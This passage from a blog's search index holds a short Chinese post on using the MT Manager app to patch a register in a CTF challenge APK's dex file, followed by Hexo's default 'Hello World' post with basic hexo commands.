    <url>/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>written in 2023&#x2F;10&#x2F;26</p><p>昨天看到0xGame的0x14537a60师傅提到了MT管理器，就去研究了一下</p><p>这是0xGame week3的第三题</p><p>首先把apk文件放到tmp文件夹，因为在原文件没有修改权限</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/1.jpg" class=""><p>随便找一个tmp文件夹放就行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/2.jpg" class=""><p>去电脑上找到onClick绝对路径</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/3.png" class=""><p>用dex编辑器打开classes.dex,若有多个一般都是最后一个dex</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/4.jpg" class=""><p>找到方法</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/5.jpg" class=""><p>进去看方法，原来是v4，改成v1</p><p>这里为什么这样改呢，我的想法是第十行result-object，还有就是第九行v1,v2和v3在一起出现</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/6.jpg" class=""><p>再重新安装后运行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/7.jpg" class=""><p>浅浅学了一下，希望对以后有点帮助</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/13/hello-world/"/>
    <url>/2024/01/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
